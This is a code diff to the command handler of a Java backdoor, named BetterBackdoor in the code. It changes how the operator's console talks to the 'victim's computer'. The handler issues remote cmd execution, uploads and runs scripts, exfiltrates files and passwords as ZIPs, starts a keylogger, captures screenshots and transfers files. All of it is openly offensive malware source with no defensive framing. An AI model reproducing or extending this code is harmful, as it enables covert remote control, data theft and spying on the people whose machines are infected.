@@ -17,17 +17,19 @@ public class HandleCommand {
 	 * @param command command given by user
 	 * @throws IOException
 	 */
-	public static void handle(String command) throws IOException {
+	public static void handle(String command) throws IOException, ClassNotFoundException {
 		switch (command) {
 			case "cmd":
 				System.out.println(
 						"Commands will now be executed through vitim's computer's Command Prompt\nEnter 'back' to go back");
 				while (true) {
-					System.out.print("cmd");
+					Shell.out.writeObject("current-cmd-dir");
+					System.out.print(getResp());
 					String cmdCommand = BetterBackdoor.getInput("");
 					if (cmdCommand.equals("back"))
 						break;
-					Shell.out.println("cmd " + cmdCommand);
+					Shell.out.writeObject("cmd " + cmdCommand);
+					Shell.out.flush();
 					System.out.println(getResp());
 				}
 				break;
@@ -42,21 +44,23 @@ public class HandleCommand {
 				System.out.println("Enter local filepath of script:");
 				File file = new File(BetterBackdoor.getInput("file"));
 				System.out.println("Sending script...");
-				Shell.out.println("filesend " + file.getName());
+				Shell.out.writeObject("filesend " + file.getName());
+				Shell.out.flush();
 				FTP.shell(file.getAbsolutePath(), "send");
 				System.out.println(getResp());
 				System.out.println("Running script...");
-				Shell.out.println(command + " " + file.getName());
+				Shell.out.writeObject(command + " " + file.getName());
 				System.out.println(getResp());
 				break;
 			}
 			case "exfiles": {
 				System.out.println(
-						"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, and delete the" +
-								" original ZIP file from the victim's computer.");
+						"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, " +
+								"and delete the original ZIP file from the victim's computer.");
 				System.out.println("Enter victim's directory to search through:");
 				String root = BetterBackdoor.getInput("");
-				Shell.out.println("filetype " + root);
+				Shell.out.writeObject("filetype " + root);
+				Shell.out.flush();
 				String filetype = getResp();
 				if (filetype.equals("file")) {
 					System.out.println("You entered a file. Invalid input.");
@@ -65,7 +69,8 @@ public class HandleCommand {
 				} else {
 					System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
 					String exts = BetterBackdoor.getInput("");
-					Shell.out.println("exfiles " + root + "*" + exts);
+					Shell.out.writeObject("exfiles " + root + "*" + exts);
+					Shell.out.flush();
 					System.out.println("Receiving files to '" + System.getProperty("user.dir") + File.separator + "gathered"
 							+ File.separator + "ExfiltartedFiles.zip'...");
 					FTP.shell("gathered" + File.separator + "ExfiltratedFiles.zip", "rec");
@@ -74,7 +79,8 @@ public class HandleCommand {
 				break;
 			}
 			case "expass":
-				Shell.out.println("expass");
+				Shell.out.writeObject("expass");
+				Shell.out.flush();
 				System.out.println("Receiving passwords to '" + System.getProperty("user.dir") + File.separator + "gathered"
 						+ File.separator + "ExfiltratedPasswords.zip'...");
 				FTP.shell("gathered" + File.separator + "ExfiltratedPasswords.zip", "rec");
@@ -95,7 +101,8 @@ public class HandleCommand {
 
 				if (file.exists()) {
 					String fileRec = BetterBackdoor.getInput("");
-					Shell.out.println("filesend " + fileRec);
+					Shell.out.writeObject("filesend " + fileRec);
+					Shell.out.flush();
 					if (file.isDirectory()) {
 						Utils.zipDir(file.getAbsolutePath());
 						FTP.shell(file.getAbsolutePath() + ".zip", "send");
@@ -111,7 +118,8 @@ public class HandleCommand {
 				System.out.println("Enter victim's filepath of file to send:");
 				String fileSend = BetterBackdoor.getInput("");
 
-				Shell.out.println("filetype " + fileSend);
+				Shell.out.writeObject("filetype " + fileSend);
+				Shell.out.flush();
 				String filetype = getResp();
 				if (filetype.equals("file"))
 					System.out.println("Enter local filepath of file to receive:");
@@ -123,17 +131,20 @@ public class HandleCommand {
 
 				if (!filetype.equals("not real")) {
 					String fileRec = BetterBackdoor.getInput("");
-					Shell.out.println("filerec " + fileSend);
+					Shell.out.writeObject("filerec " + fileSend);
+					Shell.out.flush();
 					FTP.shell(fileRec, "rec");
 					System.out.println(getResp());
 				}
 				break;
 			}
 			case "keylog":
-				Shell.out.println("cmd echo %CD:~0,2%");
-				String currentDrive = getResp();
-				Shell.out.println("cmd echo %USERNAME%");
-				String currentUser = getResp();
+				Shell.out.writeObject("current-dir");
+				Shell.out.flush();
+				String currentDrive = getResp().substring(0, 2);
+				Shell.out.writeObject("cmd echo %USERNAME%");
+				Shell.out.flush();
+				String currentUser = getResp().replaceAll(" ", "");
 
 				String logFileDir = "C:\\Users\\" + currentUser + "\\AppData\\Gathered";
 				if (!currentDrive.equals("C:")) {
@@ -145,11 +156,13 @@ public class HandleCommand {
 					if (dirChoice.equals("1"))
 						logFileDir = currentDrive;
 				}
-				Shell.out.println("keylog " + logFileDir);
+				Shell.out.writeObject("keylog " + logFileDir);
+				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "ss":
-				Shell.out.println("ss");
+				Shell.out.writeObject("ss");
+				Shell.out.flush();
 				System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
 						+ "gathered" + File.separator + "screenshot.png'...");
 				FTP.shell("gathered" + File.separator + "screenshot.png", "rec");
@@ -157,23 +170,27 @@ public class HandleCommand {
 				break;
 			case "cat":
 				System.out.println("Enter victim's filepath of file to get contents of:");
-				Shell.out.println("cat " + BetterBackdoor.getInput(""));
+				Shell.out.writeObject("cat " + BetterBackdoor.getInput(""));
+				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "zip":
 				System.out.println("Enter victim's filepath of directory to compress:");
-				Shell.out.println("zip " + BetterBackdoor.getInput(""));
+				Shell.out.writeObject("zip " + BetterBackdoor.getInput(""));
+				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "unzip":
 				System.out.println("Enter victim's filepath of ZIP file to decompress:");
-				Shell.out.println("unzip " + BetterBackdoor.getInput(""));
+				Shell.out.writeObject("unzip " + BetterBackdoor.getInput(""));
+				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "exit":
 				System.exit(0);
 			default:
-				Shell.out.println(command);
+				Shell.out.writeObject(command);
+				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 		}
@@ -184,14 +201,7 @@ public class HandleCommand {
 	 *
 	 * @return response from client
 	 */
-	private static String getResp() {
-		StringBuilder resp = new StringBuilder();
-		while (Shell.in.hasNextLine()) {
-			String line = Shell.in.nextLine();
-			if (line.equals("!$end$!"))
-				break;
-			resp.append(line).append("\n");
-		}
-		return resp.toString().substring(0, resp.length() - 1);
+	private static String getResp() throws IOException, ClassNotFoundException {
+		return (String) Shell.in.readObject();
 	}
 }
